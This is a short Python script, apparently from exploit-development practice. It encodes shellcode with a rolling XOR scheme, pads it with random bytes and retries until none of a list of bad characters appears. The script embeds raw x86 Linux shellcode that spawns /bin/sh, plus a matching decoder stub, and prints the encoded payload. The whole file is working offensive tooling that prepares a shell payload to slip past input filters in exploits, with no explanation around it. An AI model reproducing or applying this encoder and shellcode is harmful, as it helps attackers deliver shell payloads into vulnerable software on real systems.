from __future__ import print_function
import random
import struct

def generate_shellcode(shellcode, avoid_values, seed_key, prefix = "", suffix = ""):
    encoded_shellcode = ""
    xor_key = seed_key
    for char in shellcode:
        encoded_shellcode += chr(ord(char) ^ xor_key) + generate_char(avoid_values)
        xor_key = (ord(char) ^ xor_key)
    if suffix:
        encoded_shellcode = encoded_shellcode + chr(ord(suffix) ^ xor_key)
    return (chr(seed_key) + encoded_shellcode)

def generate_shellcode2(shellcode, avoid_values, seed_key, prefix = "", suffix = ""):
    
    encoded_shellcode = ""
    xor_key = seed_key
    
    for char in shellcode:
        encoded_shellcode += chr(ord(char) ^ xor_key) + generate_char(avoid_values)
        xor_key = (xor_key + (ord(char))) & 0xFF
        
    if suffix:
        encoded_shellcode = encoded_shellcode + chr(ord(suffix) ^ xor_key)
        
    return (chr(seed_key) + encoded_shellcode)

def print_shellcode(shellcode):
    for char in shellcode:
        print(hex(ord(char)) + ",", end="")

def check_shellcode(shellcode, avoid_values):
    # print("Checking shellcode")
    for char in shellcode:
        if char in avoid_values:
            # print("Bad character, trying again")
            return False
    return True

def generate_char(avoid_values):
    random_char = chr(random.randint(1,255))
    while(random_char in avoid_values):
        # print("Bad character, rolling again")
        random_char = chr(random.randint(1,255))
    return random_char

if __name__ == "__main__":
    
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x50\x8d\x5c\x24\x04\x53\x8d\x0c\x24\x8b\x54\x24\x04\xb0\x0b\xcd\x80"
    stub = "\xeb\x14\x5e\x31\xc9\x8a\x16\x46\x8a\x04\x0e\x30\xd0\x74\x0d\x88\x06\x00\xc2\x41\xeb\xf1\xe8\xe7\xff\xff\xff"
    
    avoid_values = [ '\x00', '\x0a', '\x0d', '\xda', '\x50']

    shellcode_ok = False

    while(not shellcode_ok):
        seed = random.randint(1,255)
        encoded_shellcode = generate_shellcode2(shellcode, avoid_values, seed, prefix=chr(seed), suffix="\xff")
        shellcode_ok = check_shellcode(encoded_shellcode, avoid_values)
        
    print("Before encoding:")
    print_shellcode(shellcode)
    
    print("\nAfter encoding:")
    print_shellcode(encoded_shellcode)


